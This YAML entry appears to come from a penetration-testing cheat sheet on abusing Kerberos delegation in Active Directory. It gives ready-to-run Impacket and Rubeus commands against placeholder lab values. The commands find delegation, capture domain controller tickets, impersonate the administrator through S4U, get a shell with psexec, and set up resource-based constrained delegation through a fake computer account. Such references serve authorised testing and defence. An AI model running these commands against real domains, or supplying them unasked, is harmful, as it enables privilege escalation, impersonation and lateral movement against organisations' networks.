---
description: |
  Exploit Kerberos delegation misconfigurations — unconstrained,
  constrained, and resource-based constrained delegation (RBCD).

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: john
    Password: password123
command: |
  # Find delegation
  impacket-findDelegation test.local/john:password123 -dc-ip 10.10.10.1

  # Unconstrained delegation — monitor for TGTs
  .\Rubeus.exe monitor /interval:5 /filteruser:DC$

  # Constrained delegation — S4U attack
  impacket-getST -spn cifs/target.test.local -impersonate administrator test.local/svc_sql:password123 -dc-ip 10.10.10.1
  export KRB5CCNAME=administrator.ccache
  impacket-psexec test.local/administrator@target.test.local -k -no-pass

  # RBCD — add computer and configure delegation
  impacket-addcomputer test.local/john:password123 -computer-name 'FAKE$' -computer-pass 'P@ssw0rd'
  impacket-rbcd test.local/john:password123 -action write -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip 10.10.10.1
  impacket-getST -spn cifs/target.test.local -impersonate administrator test.local/'FAKE$':'P@ssw0rd' -dc-ip 10.10.10.1
phase:
  - Exploitation
  - Lateral_Movement
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
items:
  - Username
  - Password
techniques:
  - Delegation_Abuse
network_position:
  - Internal
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html
---
